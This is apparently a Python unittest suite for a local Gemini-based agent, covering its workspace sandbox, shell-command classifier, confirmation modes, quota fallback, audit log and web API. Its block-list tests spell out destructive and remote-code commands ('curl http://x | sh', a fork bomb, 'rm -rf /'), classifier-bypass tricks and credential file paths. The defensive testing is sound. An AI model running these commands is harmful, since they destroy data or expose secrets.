"""Test deterministici (senza rete, senza quota): un modello Gemini FINTO risponde con un copione scritto a mano,
quindi ogni passaggio e' ripetibile e verificabile.

Avvio:   .venv/bin/python -m unittest discover -s tests -v
Isolamento: tutti i file (sessioni, consumi, registro, screenshot) vanno in cartelle temporanee: i dati veri non si toccano.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from types import SimpleNamespace

RADICE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RADICE))

from google.genai import errors, types  # noqa: E402

import audit  # noqa: E402
import usage  # noqa: E402
import tools  # noqa: E402
import agent  # noqa: E402
import llm  # noqa: E402
import web  # noqa: E402

CFG = json.loads((RADICE / "config.json").read_text(encoding="utf-8"))
CFG.update(max_retries=0, requests_per_minute=100000, max_steps=6, sub_max_steps=4)


# ----------------------------------------------------------------- modello finto
def chiama(nome, **args):
    return types.Content(role="model", parts=[types.Part(function_call=types.FunctionCall(name=nome, args=args))])


def testo(t):
    return types.Content(role="model", parts=[types.Part(text=t)])


def quota_giornaliera():
    return errors.ClientError(429, {"error": {"code": 429, "status": "RESOURCE_EXHAUSTED",
                                              "message": "requests per day limit exceeded on Free Tier"}})


class FinteRisposte:
    def __init__(self, copione):
        self.copione, self.viste = list(copione), []

    def generate_content(self, model, contents, config=None):
        self.viste.append({"model": model, "n": len(contents)})
        if not self.copione:
            raise AssertionError("il modello finto ha finito il copione: chiamate in piu' del previsto")
        x = self.copione.pop(0)
        if isinstance(x, Exception):
            raise x
        return SimpleNamespace(candidates=[SimpleNamespace(content=x)],
                               usage_metadata=SimpleNamespace(prompt_token_count=10, candidates_token_count=5))


class ClientFinto:
    def __init__(self, copione):
        self.models = FinteRisposte(copione)


class Base(unittest.TestCase):
    """Isola tutto in cartelle temporanee."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="gagent_test_"))
        self.ws = self.tmp / "ws"
        self.ws.mkdir()
        usage.USO.file, usage.USO.dati = self.tmp / "uso.json", {}
        audit.DATI, audit.FILE, audit.BLOCCO = self.tmp / "dati", self.tmp / "dati/audit.jsonl", self.tmp / "dati/BLOCCATO"
        tools.SCREEN_DIR = self.tmp / "screens"
        llm.PROVIDER[:] = []
        self.log, self.domande = [], []

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)
        llm.PROVIDER[:] = []

    def ctx(self, modo="chiedi", rispondi=True, client=None, ws=None):
        def conferma(t):
            self.domande.append(t)
            return rispondi
        return tools.Context(CFG, ws or self.ws, conferma, client, agent.RateLimiter(100000), log=self.log.append, modo=modo)

    def corri(self, copione, obiettivo="fai", modo="chiedi", rispondi=True, max_steps=6):
        client = ClientFinto(copione)
        cx = self.ctx(modo, rispondi, client)
        sess = agent.Sessione(self.tmp / "sessions", [], None)
        ris = agent.esegui_obiettivo(cx, sess, obiettivo, max_steps=max_steps)
        return ris, cx, sess, client


# ----------------------------------------------------------------- sandbox dei percorsi
class TestSandbox(Base):
    def test_percorsi_fuori_workspace_bloccati(self):
        cx = self.ctx()
        for p in ("../x", "/etc/hostname", "a/../../x"):
            with self.assertRaises(PermissionError, msg=p):
                tools._safe_path(cx, p)

    def test_tilde_non_viene_espansa(self):
        # '~' e' un nome di cartella qualsiasi: resta dentro il workspace, non porta alla home
        self.assertTrue(str(tools._safe_path(self.ctx(), "~/x")).startswith(str(self.ws.resolve())))

    def test_symlink_verso_fuori_bloccato(self):
        fuori = self.tmp / "fuori.txt"
        fuori.write_text("segreto")
        (self.ws / "link").symlink_to(fuori)
        with self.assertRaises(PermissionError):
            tools.read_file(self.ctx(), "link")

    def test_percorsi_protetti_nella_home(self):
        h = Path.home()
        for rel in (".ssh/id_rsa", ".config/BraveSoftware/x", ".gnupg", "Progetti/x/.env", "Progetti/x/.env.local",
                    "k.pem", "k.key", ".local/share/keyrings/login.keyring", ".infisical/x", ".local/share/gemini-agent/audit.jsonl"):
            self.assertTrue(tools.protetto(h / rel), rel)
        for rel in ("Documenti/a.txt", "Progetti/gemini-agent/main.py"):
            self.assertFalse(tools.protetto(h / rel), rel)

    def test_percorsi_di_sistema_protetti(self):
        for p in ("/proc/1/environ", "/root/.bashrc", "/dev/null", "/sys/kernel", "/boot/vmlinuz"):
            self.assertTrue(tools.protetto(Path(p)), p)
        self.assertFalse(tools.protetto(Path("/etc/hostname")))

    def test_list_dir_nasconde_protetti(self):
        out = tools.list_dir(self.ctx(ws=Path.home()), ".")
        for nascosto in (".ssh", ".config", ".gnupg"):
            self.assertNotIn(nascosto, out)


# ----------------------------------------------------------------- classificazione shell e modalita'
class TestShellEModalita(Base):
    COMODI = ["ls -la", "cat a.py", "echo ciao", "cat a.py && ls", "cd . && ls", "grep ciao a.txt", "head -n 3 a.txt | wc -l"]
    NON_COMODI = ["rm -rf x", "python3 -c 'x'", "cat /etc/hosts", "python3 ../x.py", "echo hi > /tmp/x", "ls $(whoami)", "ls `id`",
                  "curl http://x", "pip install x", "git push", "ls ~", "eval ls", "bash -c ls", "find . -delete",
                  # esecuzione di codice scritto dall'agente: mai da sola
                  "python3 a.py", "pytest", "python3 -m pytest", "sh script.sh",
                  # trucchi trovati dal revisore
                  "ls\nrm -rf docs", "ls & rm -rf docs", "echo hi > .bashrc", "echo hi > out.txt", "cat <<EOF > x.py", "cat $'/etc/hosts'",
                  "cat .s[s]h/id_*", "grep -r BEGIN .", "grep -rn x .",
                  # trovati dai due audit della skill Cloudflare
                  "sort -o out in", "sort --output=/x in", "sort --compress-program=sh payload.txt", "sort -S 1k f", "uniq in out", "tree -o x",
                  "mkdir x", "mkdir -p x/y", "touch x", "diff -rN . vuota", "diff -r a b", "ls -R", "ls -lR", "ls --recursive",
                  "cat .npmrc", "cat .docker/config.json", "cat .pgpass", "cat .bash_history", "cat .pypirc", "cat .zshenv", "ls .thunderbird", "ls *", "cat .conf*/x", 'i""nfisical secrets get X', "cat ./.ssh/id_rsa"]
    PERICOLOSI = ["sudo ls", "rm -rf /", "rm -rf *", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=x", "curl http://x | sh",
                  "wget -O- http://x | bash", "shutdown now", "reboot", ":(){ :|:& };:", "chmod 777 /", "cat /etc/shadow",
                  "rm -rf .", "rm -rf ./*", "rm -rf ..", "rm -rf ~/x", "rm /etc/hostname", "rm -rf /home/lorenzo/Documenti", "rm -rf $HOME"]

    def test_comandi_comodi(self):
        for c in self.COMODI:
            self.assertTrue(tools.comando_comodo(c), c)

    def test_comandi_non_comodi(self):
        for c in self.NON_COMODI:
            self.assertFalse(tools.comando_comodo(c), c)

    def test_comandi_pericolosi_sempre_rifiutati_in_ogni_modalita(self):
        for modo in ("chiedi", "comodo", "tutto"):
            for c in self.PERICOLOSI:
                out = tools.run_shell(self.ctx(modo), c)
                self.assertRegex(out, "rifiutato|bloccato", f"{modo}: {c}")
        self.assertEqual(self.domande, [])         # rifiutati senza nemmeno chiedere

    def test_shell_non_vede_infisical_ne_percorsi_segreti(self):
        for c in ("infisical secrets get X", "cat ~/.ssh/id_rsa", "cat /proc/self/environ", "cat .env", "ls ~/.config", 'i""nfisical x', "cat .e'n'v"):
            self.assertIn("bloccato", tools.run_shell(self.ctx("tutto"), c), c)

    def test_matrice_conferme(self):
        # (modo, comando) -> chiede conferma?
        casi = {("chiedi", "ls"): True, ("comodo", "ls"): False, ("tutto", "ls"): False,
                ("chiedi", "rm a.txt"): True, ("comodo", "rm a.txt"): True, ("tutto", "rm a.txt"): False,
                ("comodo", "python3 x.py"): True, ("tutto", "python3 x.py"): False}
        for (modo, cmd), atteso in casi.items():
            self.domande.clear()
            tools.run_shell(self.ctx(modo), cmd)
            self.assertEqual(bool(self.domande), atteso, f"{modo} {cmd}")

    def test_ambiente_shell_senza_variabili_ereditate(self):
        os.environ["SEGRETO_FINTO"] = "XYZ123"
        try:
            out = tools.run_shell(self.ctx("tutto"), "env")
        finally:
            del os.environ["SEGRETO_FINTO"]
        self.assertNotIn("XYZ123", out)

    def test_rifiuto_restituisce_messaggio_che_vieta_di_insistere(self):
        out = tools.run_shell(self.ctx("chiedi", rispondi=False), "ls")
        self.assertIn("RIFIUTATO", out)
        self.assertIn("Non ritentare", out)


# ----------------------------------------------------------------- strumenti sui file
class TestFile(Base):
    def test_scrivere_nuovo_non_chiede_sovrascrivere_si(self):
        cx = self.ctx("chiedi")
        tools.write_file(cx, "a.txt", "uno")
        self.assertEqual(self.domande, [])
        tools.write_file(cx, "a.txt", "due")
        self.assertEqual(len(self.domande), 1)
        self.assertEqual((self.ws / "a.txt").read_text(), "due")

    def test_sovrascrittura_rifiutata_non_cambia_il_file(self):
        (self.ws / "a.txt").write_text("originale")
        self.assertIn("RIFIUTATO", tools.write_file(self.ctx("chiedi", rispondi=False), "a.txt", "nuovo"))
        self.assertEqual((self.ws / "a.txt").read_text(), "originale")

    def test_edit_richiede_occorrenza_unica(self):
        (self.ws / "a.txt").write_text("x x y")
        self.assertIn("2 volte", tools.edit_file(self.ctx("tutto"), "a.txt", "x", "z"))
        self.assertEqual(tools.edit_file(self.ctx("tutto"), "a.txt", "y", "z"), "Modificato a.txt (verificato)")
        self.assertEqual((self.ws / "a.txt").read_text(), "x x z")

    def test_cancellare_chiede_tranne_in_tutto(self):
        (self.ws / "a.txt").write_text("1")
        tools.delete_file(self.ctx("comodo"), "a.txt")
        self.assertEqual(len(self.domande), 1)
        (self.ws / "b.txt").write_text("1")
        self.domande.clear()
        tools.delete_file(self.ctx("tutto"), "b.txt")
        self.assertEqual(self.domande, [])
        self.assertFalse((self.ws / "b.txt").exists())

    def test_output_lunghi_troncati(self):
        (self.ws / "g.txt").write_text("a" * (CFG["max_tool_output_chars"] + 500))
        self.assertIn("troncato", tools.read_file(self.ctx(), "g.txt"))

    def test_fetch_url_rifiuta_indirizzi_locali(self):
        for u in ("http://127.0.0.1:8765/", "http://localhost/", "file:///etc/passwd", "http://192.168.1.1/"):
            self.assertRegex(tools.fetch_url(self.ctx(), u), "Errore")


# ----------------------------------------------------------------- git
class TestGit(Base):
    def setUp(self):
        super().setUp()
        bare, self.repo = self.tmp / "remoto.git", self.tmp / "repo"
        subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
        subprocess.run(["git", "clone", "-q", str(bare), str(self.repo)], check=True, capture_output=True)
        for k, v in (("user.email", "t@t"), ("user.name", "t")):
            subprocess.run(["git", "-C", str(self.repo), "config", k, v], check=True)
        (self.repo / "a.txt").write_text("1\n")

    def test_flusso_e_push_chiede_sempre(self):
        for modo in ("chiedi", "comodo", "tutto"):
            self.domande.clear()
            cx = self.ctx(modo, rispondi=False, ws=self.repo)
            (self.repo / f"{modo}.txt").write_text("x\n")
            tools.git(cx, "add", f"{modo}.txt")
            tools.git(cx, "commit", f"commit {modo}") if modo == "tutto" else None
            out = tools.git(cx, "push")
            self.assertTrue(any("PUBBLICARE" in d for d in self.domande), modo)
            self.assertIn("RIFIUTATO", out)

    def test_azione_non_valida_e_percorso_fuori(self):
        cx = self.ctx("tutto", ws=self.repo)
        self.assertIn("non valida", tools.git(cx, "reset"))
        with self.assertRaises(PermissionError):
            tools.git(cx, "add", "../x")

    def test_non_repository(self):
        self.assertIn("non e' un repository", tools.git(self.ctx("tutto"), "status"))


# ----------------------------------------------------------------- loop dell'agente (modello finto)
class TestAgente(Base):
    def test_crea_file_e_risponde(self):
        ris, cx, sess, cl = self.corri([chiama("write_file", path="a.txt", content="ciao"), testo("Fatto")])
        self.assertEqual(ris, "Fatto")
        self.assertEqual((self.ws / "a.txt").read_text(), "ciao")
        # struttura della cronologia: user, model(call), user(response), model(testo)
        self.assertEqual([c.role for c in sess.contents], ["user", "model", "user", "model"])
        self.assertTrue(sess.contents[2].parts[0].function_response)

    def test_limite_di_passi(self):
        ris, _, _, cl = self.corri([chiama("list_dir")] * 10, max_steps=3)
        self.assertIn("limite di 3 passi", ris)
        self.assertEqual(len(cl.models.viste), 3)

    def test_errore_dello_strumento_torna_al_modello(self):
        ris, _, sess, _ = self.corri([chiama("read_file", path="../fuori"), testo("ok")])
        risposta = sess.contents[2].parts[0].function_response.response["result"]
        self.assertIn("fuori dal workspace", risposta)
        self.assertEqual(ris, "ok")

    def test_strumento_inesistente_non_manda_in_crash(self):
        ris, _, sess, _ = self.corri([chiama("fa_il_caffe"), testo("ok")])
        self.assertIn("Errore", sess.contents[2].parts[0].function_response.response["result"])

    def test_rifiuto_arriva_al_modello(self):
        (self.ws / "a.txt").write_text("x")
        _, _, sess, _ = self.corri([chiama("run_shell", command="rm a.txt"), testo("ok")], rispondi=False)
        self.assertIn("RIFIUTATO", sess.contents[2].parts[0].function_response.response["result"])
        self.assertTrue((self.ws / "a.txt").exists())

    def test_blocco_impedisce_gli_strumenti(self):
        audit.imposta_blocco(True)
        _, _, sess, _ = self.corri([chiama("write_file", path="a.txt", content="x"), testo("ok")])
        self.assertIn("BLOCCATI", sess.contents[2].parts[0].function_response.response["result"])
        self.assertFalse((self.ws / "a.txt").exists())

    def test_ogni_strumento_finisce_nel_registro(self):
        self.corri([chiama("list_dir"), chiama("read_file", path="no.txt"), testo("ok")])
        self.assertEqual([r["strumento"] for r in reversed(audit.ultime(10))], ["list_dir", "read_file"])

    def test_stop_ferma_prima_del_modello(self):
        cx = self.ctx(client=ClientFinto([testo("mai")]))
        cx.stop.set()
        with self.assertRaises(agent.Fermato):
            agent.esegui_obiettivo(cx, agent.Sessione(self.tmp / "s", [], None), "x")

    def test_sessione_salvata_e_ripresa(self):
        _, _, sess, _ = self.corri([testo("uno")], obiettivo="primo")
        ripresa = agent.Sessione(sess.file.parent, [], sess.sid)
        self.assertEqual(len(ripresa.contents), 2)
        cx = self.ctx(client=ClientFinto([testo("due")]))
        self.assertEqual(agent.esegui_obiettivo(cx, ripresa, "secondo"), "due")
        self.assertEqual(len(ripresa.contents), 4)

    def test_segreti_mai_nei_file_di_sessione(self):
        cx = self.ctx(client=ClientFinto([testo("la chiave e' SEGRETO-ABC-123")]))
        sess = agent.Sessione(self.tmp / "s", ["SEGRETO-ABC-123"], None)
        agent.esegui_obiettivo(cx, sess, "x")
        contenuto = sess.file.read_text(encoding="utf-8")
        self.assertNotIn("SEGRETO-ABC-123", contenuto)
        self.assertIn("[SEGRETO]", contenuto)

    def test_sotto_agenti_in_parallelo_condividono_il_limitatore(self):
        # principale: delega 2 compiti; i due sotto-agenti rispondono subito; poi il principale chiude
        client = ClientFinto([chiama("delega_agenti", compiti=["a", "b"]), testo("sotto 1"), testo("sotto 2"), testo("riepilogo")])
        cx = self.ctx("tutto", client=client)
        sess = agent.Sessione(self.tmp / "s", [], None)
        ris = agent.esegui_obiettivo(cx, sess, "x")
        self.assertEqual(ris, "riepilogo")
        out = sess.contents[2].parts[0].function_response.response["result"]
        self.assertIn("sotto1", out)
        self.assertIn("sotto2", out)
        self.assertEqual(len(client.models.viste), 4)

    def test_un_sotto_agente_non_puo_delegare(self):
        cx = tools.Context(CFG, self.ws, lambda t: True, depth=1, log=lambda t: None)
        self.assertIn("non puo' delegare", tools.delega_agenti(cx, ["x"]))
        self.assertNotIn("delega_agenti", [d["name"] for d in tools.declarations(1)])


# ----------------------------------------------------------------- quota, fallback e consumi
class TestQuotaEFallback(Base):
    def test_gemini_a_gemini_di_riserva(self):
        ris, _, _, cl = self.corri([quota_giornaliera(), testo("dalla riserva")])
        self.assertEqual(ris, "dalla riserva")
        self.assertEqual([v["model"] for v in cl.models.viste], [CFG["model"], CFG["fallback_model"]])
        self.assertTrue(usage.USO.e_esaurito(CFG["model"]))

    def test_tutti_i_servizi_finiti_messaggio_chiaro(self):
        with self.assertRaises(agent.QuotaGiornalieraFinita) as e:
            self.corri([quota_giornaliera(), quota_giornaliera()])
        self.assertIn("mezzanotte", str(e.exception))

    def test_il_giorno_dopo_il_modello_e_di_nuovo_disponibile(self):
        usage.USO.esaurito(CFG["model"])
        self.assertTrue(usage.USO.e_esaurito(CFG["model"]))
        usage.USO.dati["_esauriti"][CFG["model"]] = "2000-01-01"
        self.assertFalse(usage.USO.e_esaurito(CFG["model"]))

    def test_modello_esaurito_oggi_viene_saltato_subito(self):
        usage.USO.esaurito(CFG["model"])
        _, _, _, cl = self.corri([testo("ok")])
        self.assertEqual(cl.models.viste[0]["model"], CFG["fallback_model"])

    def test_consumi_contati_con_token(self):
        self.corri([chiama("list_dir"), testo("ok")])
        m = usage.USO.dati[usage.oggi()][CFG["model"]]
        self.assertEqual((m["richieste"], m["in"], m["out"]), (2, 20, 10))

    def test_riepilogo_e_reset(self):
        r = usage.USO.riepilogo(CFG, [])
        self.assertGreater(r["reset"], time.time())
        self.assertLessEqual(r["reset"] - time.time(), 86400 + 60)
        self.assertEqual(len(r["storia"]), 7)

    def test_fallback_su_provider_compatibile_openai(self):
        visti = []

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                corpo = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                visti.append(corpo)
                if not any(m["role"] == "tool" for m in corpo["messages"]):
                    msg = {"content": None, "tool_calls": [{"id": "z", "type": "function", "function": {
                        "name": "write_file", "arguments": json.dumps({"path": "p.txt", "content": "dal provider"})}}]}
                else:
                    msg = {"content": "finito col provider"}
                out = json.dumps({"choices": [{"message": msg}], "usage": {"prompt_tokens": 7, "completion_tokens": 3}}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(out)

        srv = HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        llm.PROVIDER[:] = [{"nome": "finto", "base_url": f"http://127.0.0.1:{srv.server_port}/v1", "modello": "m", "key": "k"}]
        try:
            ris, _, _, _ = self.corri([quota_giornaliera(), quota_giornaliera()])
        finally:
            srv.shutdown()
        self.assertEqual(ris, "finito col provider")
        self.assertEqual((self.ws / "p.txt").read_text(), "dal provider")
        ruoli = [m["role"] for m in visti[1]["messages"]]
        self.assertEqual(ruoli, ["system", "user", "assistant", "tool"])
        self.assertEqual(visti[1]["messages"][-1]["tool_call_id"], visti[1]["messages"][-2]["tool_calls"][0]["id"])
        self.assertTrue(usage.USO.dati[usage.oggi()]["finto:m"]["richieste"] == 2)

    def test_conversione_cronologia_ids_coerenti(self):
        contents = [types.Content(role="user", parts=[types.Part(text="ciao")]),
                    types.Content(role="model", parts=[types.Part(function_call=types.FunctionCall(name="a", args={"x": 1})),
                                                       types.Part(function_call=types.FunctionCall(name="b", args={}))]),
                    types.Content(role="user", parts=[types.Part.from_function_response(name="a", response={"result": "1"}),
                                                      types.Part.from_function_response(name="b", response={"result": "2"})])]
        m = llm.a_messaggi(contents, "sistema")
        ids = [t["id"] for t in m[2]["tool_calls"]]
        self.assertEqual([x["tool_call_id"] for x in m[3:5]], ids)


# ----------------------------------------------------------------- registro e blocco
class TestAudit(Base):
    def test_registro_oscura_i_segreti_e_ordina(self):
        audit.registra("agente", "run_shell", {"command": "echo SEGRETO-9"}, "ok SEGRETO-9", redact=["SEGRETO-9"])
        audit.registra("agente", "list_dir", {}, "ok")
        righe = audit.ultime(5)
        self.assertEqual([r["strumento"] for r in righe], ["list_dir", "run_shell"])
        self.assertNotIn("SEGRETO-9", audit.FILE.read_text())

    def test_blocco_persistente(self):
        self.assertFalse(audit.bloccato())
        audit.imposta_blocco(True)
        self.assertTrue(audit.bloccato())
        audit.imposta_blocco(False)
        self.assertFalse(audit.bloccato())


# ----------------------------------------------------------------- API web (Flask test client)
class TestWeb(Base):
    TOKEN = "token-di-prova-molto-lungo-123"

    def app(self, copione=()):
        base = self.tmp / "base"
        base.mkdir(exist_ok=True)
        for f in ("pagina.html", "manifest.json", "icona.svg"):
            shutil.copy(RADICE / f, base / f)
        web.BASE = base
        self.client_finto = ClientFinto(copione)
        app = web.crea_app(dict(CFG, cartelle={"prova": str(self.tmp / "altra")}), self.ws, "chiave-finta", self.client_finto,
                           agent.RateLimiter(100000), self.TOKEN)
        (self.tmp / "altra").mkdir(exist_ok=True)
        web.RUNS.clear()
        return app

    def entra(self, app):
        c = app.test_client()
        r = c.post("/login", data={"token": self.TOKEN})
        self.assertEqual(r.status_code, 303)
        return c

    def aspetta(self, c, cond, timeout=15):
        t0 = time.time()
        while time.time() - t0 < timeout:
            st = c.get("/api/stato").get_json()
            if cond(st):
                return st
            time.sleep(0.1)
        self.fail("timeout: " + json.dumps(c.get("/api/stato").get_json())[:300])

    def test_autenticazione(self):
        app = self.app()
        c = app.test_client()
        for p in ("/api/stato", "/api/sessioni", "/api/consumi", "/api/registro", "/api/files"):
            self.assertEqual(c.get(p).status_code, 401, p)
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "x"}).status_code, 401)
        self.assertEqual(c.post("/login", data={"token": "sbagliato"}).status_code, 401)
        self.assertEqual(self.entra(app).get("/api/stato").status_code, 200)

    def test_cookie_valido_dopo_riavvio_e_falso_rifiutato(self):
        c = self.entra(self.app())
        cookie = c.get_cookie("sid").value
        c2 = self.app().test_client()                       # "riavvio": nuova app, stesso token
        c2.set_cookie("sid", cookie)
        self.assertEqual(c2.get("/api/stato").status_code, 200)
        c3 = self.app().test_client()
        c3.set_cookie("sid", "x.9999999999.deadbeef")
        self.assertEqual(c3.get("/api/stato").status_code, 401)

    def test_post_non_json_rifiutato(self):
        c = self.entra(self.app())
        self.assertEqual(c.post("/api/nuovo", data={"obiettivo": "x"}).status_code, 400)

    def test_file_e_cartelle_fuori_perimetro(self):
        c = self.entra(self.app())
        for p in ("../config.json", "/etc/passwd", "..%2fconfig.json"):
            self.assertEqual(c.get("/api/file?path=" + p).status_code, 404, p)
        self.assertEqual(c.get("/api/files?cartella=/etc").status_code, 400)
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "x", "cartella": "/etc"}).status_code, 400)
        self.assertEqual(c.get("/api/screen/..%2f..%2fetc%2fpasswd").status_code, 404)
        self.assertEqual(c.get("/api/sessione/..%2fconfig").status_code in (400, 404), True)

    def test_flusso_conferma_approvata_e_rifiutata(self):
        for approva in (True, False):
            (self.ws / "x.txt").write_text("1")
            c = self.entra(self.app([chiama("run_shell", command="rm x.txt"), testo("fine")]))
            rid = c.post("/api/nuovo", json={"obiettivo": "cancella", "modo": "chiedi"}).get_json()["id"]
            st = self.aspetta(c, lambda s: s["runs"] and s["runs"][0]["conferme"])
            conf = st["runs"][0]["conferme"][0]
            self.assertIn("rm x.txt", conf["testo"])
            self.assertEqual(c.post("/api/conferma", json={"run": rid, "id": conf["id"], "ok": approva}).status_code, 200)
            st = self.aspetta(c, lambda s: not s["runs"][0]["attivo"])
            self.assertEqual(st["runs"][0]["stato"], "finito")
            self.assertEqual((self.ws / "x.txt").exists(), not approva, f"approva={approva}")
            self.assertEqual(st["runs"][0]["turni"][0]["a"], "fine")

    def test_modo_comodo_esegue_senza_chiedere(self):
        c = self.entra(self.app([chiama("run_shell", command="echo ciao"), testo("fine")]))
        c.post("/api/nuovo", json={"obiettivo": "x", "modo": "comodo"})
        st = self.aspetta(c, lambda s: s["runs"] and not s["runs"][0]["attivo"])
        self.assertEqual(st["runs"][0]["stato"], "finito")
        self.assertEqual(st["runs"][0]["conferme"], [])

    def test_blocco_dalla_pagina(self):
        c = self.entra(self.app([testo("x")]))
        self.assertTrue(c.post("/api/blocco", json={"attivo": True}).get_json()["bloccato"])
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "x"}).status_code, 423)
        self.assertTrue(c.get("/api/stato").get_json()["bloccato"])
        c.post("/api/blocco", json={"attivo": False})
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "x"}).status_code, 200)

    def test_modalita_non_valida(self):
        c = self.entra(self.app())
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "x", "modo": "boh"}).status_code, 400)
        self.assertEqual(c.post("/api/nuovo", json={"obiettivo": "  "}).status_code, 400)

    def test_cronologia_ricostruita_ed_eliminazione(self):
        c = self.entra(self.app([chiama("list_dir"), testo("risposta finale")]))
        c.post("/api/nuovo", json={"obiettivo": "elenca"})
        st = self.aspetta(c, lambda s: s["runs"] and not s["runs"][0]["attivo"])
        sid = st["runs"][0]["sid"]
        ricostruita = c.get(f"/api/sessione/{sid}").get_json()["turni"]
        self.assertEqual((ricostruita[0]["q"], ricostruita[0]["a"]), ("elenca", "risposta finale"))
        self.assertTrue(any("strumento: list_dir" in l for l in ricostruita[0]["log"]))
        self.assertIn(sid, [s["sid"] for s in c.get("/api/sessioni").get_json()["sessioni"]])
        self.assertEqual(c.post("/api/elimina", json={"sid": "../x"}).status_code, 400)
        self.assertEqual(c.post("/api/elimina", json={"sid": sid}).get_json()["eliminati"], 1)
        self.assertNotIn(sid, [s["sid"] for s in c.get("/api/sessioni").get_json()["sessioni"]])

    def test_consumi_e_registro_via_api(self):
        c = self.entra(self.app([chiama("list_dir"), testo("ok")]))
        c.post("/api/nuovo", json={"obiettivo": "x"})
        self.aspetta(c, lambda s: s["runs"] and not s["runs"][0]["attivo"])
        cons = c.get("/api/consumi").get_json()
        self.assertEqual(sum(m["richieste"] for m in cons["modelli"]), 2)
        self.assertEqual(c.get("/api/registro").get_json()["righe"][0]["strumento"], "list_dir")

    def test_pagina_servita_e_senza_innerhtml(self):
        html = (RADICE / "pagina.html").read_text(encoding="utf-8")
        for vietato in (".innerHTML", "insertAdjacentHTML", "document.write", "eval(", "outerHTML"):
            self.assertNotIn(vietato, html, vietato)       # il testo del modello non deve mai diventare HTML
        c = self.entra(self.app())
        self.assertIn("Gemini Agent", c.get("/").get_data(as_text=True))
        self.assertEqual(self.app().test_client().get("/api/stato").status_code, 401)


if __name__ == "__main__":
    unittest.main(verbosity=2)
